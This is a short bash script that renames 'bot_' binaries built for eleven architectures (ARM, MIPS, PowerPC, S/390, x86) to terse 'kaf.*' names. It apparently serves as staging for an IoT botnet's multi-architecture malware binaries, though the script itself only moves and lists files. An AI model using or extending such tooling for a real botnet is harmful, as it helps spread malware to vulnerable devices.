#!/bin/bash

# Mapping: original -> new name
# bot_arm64 -> kaf.64 (ARM 64-bit)
# bot_armv7 -> kaf.arm7 (ARMv7)
# bot_armv5 -> kaf.arm5 (ARMv5)
# bot_armv4 -> kaf.arm4 (ARMv4)
# bot_i386 -> kaf.i386 (Intel 32-bit)
# bot_linux_x86_64 -> kaf.x86 (AMD/Intel 64-bit)
# bot_mips -> kaf.mips (MIPS big endian)
# bot_mips64el -> kaf.mps64 (MIPS64 little endian)
# bot_mipsel -> kaf.mpsl (MIPS little endian)
# bot_ppc64el -> kaf.ppc (PowerPC 64-bit)
# bot_s390x -> kaf.s390 (IBM S/390)

# Rename each bot
[ -f "bot_arm64" ] && mv -v bot_arm64 kaf.64
[ -f "bot_armv7" ] && mv -v bot_armv7 kaf.arm7
[ -f "bot_armv5" ] && mv -v bot_armv5 kaf.arm5
[ -f "bot_armv4" ] && mv -v bot_armv4 kaf.arm4
[ -f "bot_i386" ] && mv -v bot_i386 kaf.i386
[ -f "bot_linux_x86_64" ] && mv -v bot_linux_x86_64 kaf.x86
[ -f "bot_mips" ] && mv -v bot_mips kaf.mips
[ -f "bot_mips64el" ] && mv -v bot_mips64el kaf.mps64
[ -f "bot_mipsel" ] && mv -v bot_mipsel kaf.mpsl
[ -f "bot_ppc64el" ] && mv -v bot_ppc64el kaf.ppc
[ -f "bot_s390x" ] && mv -v bot_s390x kaf.s390

echo ""
echo "=== Renamed files ==="
ls -la kaf.* 2>/dev/null
